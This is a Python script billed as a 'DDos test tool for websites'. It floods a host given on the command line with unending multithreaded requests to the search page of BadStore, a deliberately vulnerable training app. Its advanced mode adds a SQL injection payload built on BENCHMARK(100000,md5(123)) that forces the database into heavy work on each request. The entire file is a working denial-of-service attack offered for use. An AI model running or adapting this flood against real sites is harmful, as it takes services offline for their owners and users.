#!/usr/bin/python
import argparse
import logging
import random
import socket
import ssl
import sys
import time
import requests
import threading
import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m' # xanh da troi
    OKGREEN = '\033[92m' #
    WARNING = '\033[93m' #vang
    FAIL = '\033[91m'   #do
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Request(threading.Thread):
    def __init__(self, url , run_event ):
        threading.Thread.__init__(self)
        self.url = url
        self.run_event = run_event

    def run(self):
        while self.run_event.is_set():
            self.request(self.url)

    def request(self, url):

        listUserAgent = [
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36',
            'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
            'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1',
        ]
        try:
            headers = {'User-Agent': random.choice(listUserAgent)}
            response = requests.get(url, headers=headers, timeout=15, allow_redirects=False)
        except:
            pass

        return True

def genkey( start=32, stop=126, len=15):
    b = ''
    for i in xrange(0, len):
        a = random.randint(start, stop)
        b = b + chr(a)
    return b

parser = argparse.ArgumentParser('DDos test tool for websites')
parser.add_argument('-t', '--thread', default= 300 , help='number thread running. Defaul is 300 thread' )
parser.add_argument('host', nargs="?", help="Host to preform stress test on")
parser.add_argument('--advance', '-a',action='store_true' , help='mode advance')
args = parser.parse_args()
if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

NumberThread = int(args.thread)
print 'Start attach...'
run_event = threading.Event()
run_event.set()
threads = []
if args.advance:
    url = "http://%s/cgi-bin/badstore.cgi?searchquery='XOR(BENCHMARK(100000,md5(123)))OR'&action=search" % (args.host)
else:
    url = 'http://%s/cgi-bin/badstore.cgi?searchquery=%s&action=search' % (args.host, genkey(48, 57, 6))

for i in range(NumberThread):
    thread = Request(url, run_event)
    threads.append(thread)
    thread.start()

try:
    while 1:
        time.sleep(.1)
except KeyboardInterrupt:
    print  bcolors.WARNING + "Application exit..." + bcolors.ENDC
    run_event.clear()
    for p in threads:
        p.join()